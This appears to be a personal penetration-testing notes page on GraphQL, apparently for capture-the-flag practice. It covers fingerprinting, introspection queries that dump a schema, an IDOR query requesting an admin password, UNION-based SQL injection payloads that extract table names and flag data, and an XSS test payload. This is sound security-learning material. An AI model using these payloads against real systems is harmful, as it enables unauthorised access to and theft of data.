---
layout: default
title: GraphQL
permalink: /Web/graphql/
---

# Basics

A GraphQL service typically runs on a single endpoint, most commonly at `/graphql`, `/api/graphql`, or something similar.

For details: [https://graphql.org/learn/](https://graphql.org/learn/)

# graphw00f
Frist clone the [repository](https://github.com/dolevf/graphw00f), then run the `main.py` script.
```
python3 main.py -d -f -t http://$ip
```
- `-f`: fingerprint mode
- `-d`: detect mode

Accessing the GraphQl endpoint in a browser can reveal additional information.

## Introspection
Introspection is a GraphQL feature to query about the structure of the backend system.
All GraphQL types supported by the backend:
```
{
  __schema {
    types {
      name
    }
  }
}
```
After we know a type, we can obtain the name of all of the type's fields with the following introspection query:
```
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```
We can also obtain all the queries supported by the backend:
```
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```
Query that dumps all information about types, fields, and queries supported by the backend:
```
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
```

We can visualize the schema using tools such as [GraphQL-Voyager](https://github.com/APIs-guru/graphql-voyager).

# Insecure Direct Object Reference (IDOR)

A good start is to enumerate requests with Burp.

A query like that in a POST request could reveal a password:
```
{"query":"{user(username: \"admin\") { username password }}"}
```

# Injection Attacks

## SQL Injection
We should investigate all GraphQL queries, check whether they support arguments, and analyze these arguments for potential SQL injections.
We can send the query without any arguments and if the backend expects an argument, the response contains an error that tells us the name of the required argument.
When a GraphQL query returns a structured object (like UserObject), UNION-based SQL injection can be used by aligning your payload with the structure of the object.
Example:
- Target GraphQL Field: user
- Returned Object Type: UserObject (6 fields: uuid, id, username, password, role, msg - results of the introspection query)
- Injection Vector: username parameter

1. Discover Table Names
```
{
  user(username: "' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```
- Match number of columns in UNION SELECT to fields in the return object.
- Use GROUP_CONCAT() to aggregate results when only one row is returned.
- Payload is injected inside a string argument to a GraphQL object query.
- Terminate original query with ' and comment remainder with -- -.

2. Discover Column Names in flag Table
```
{
  user(username: "' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='flag'-- -") {
    username
  }
}
```
3. Extract Flag from flag Table
```
{
  user(username: "' UNION SELECT 1,2,flag,4,5,6 FROM flag-- -") {
    username
  }
}
```

## Cross-Site Scripting (XSS)
XSS vulnerabilities can occur if GraphQL responses are inserted into the HTML page without proper sanitization.
Potential testing payload:
```
<script>alert(1)</script>
```
